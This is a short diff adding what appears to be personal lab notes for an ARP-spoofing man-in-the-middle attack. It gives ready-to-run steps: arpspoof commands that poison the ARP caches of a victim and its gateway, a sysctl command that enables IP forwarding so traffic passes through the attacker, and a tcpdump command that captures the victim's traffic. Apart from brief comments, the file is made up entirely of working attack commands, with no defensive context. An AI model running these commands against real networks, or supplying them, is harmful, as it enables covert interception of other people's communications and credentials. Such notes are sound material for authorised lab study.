@@ -1,0 +1,13 @@
+ARP Spoofing MITM Attack
+
+1,# Poison victim: tell victim "gateway is at my MAC"
+sudo arpspoof -i eth0 -t VictimIP GatewayIP
+
+2,# Poison gateway: tell gateway "victim is at my MAC"
+sudo arpspoof -i eth0 -t GatewayIP VictimIP
+
+3,sudo sysctl -w net.ipv4.ip_forward=1
+
+4, Use Wireshark or this cmd to monitor the traffic
+
+sudo tcpdump -i ens33 host 192.168.1.6
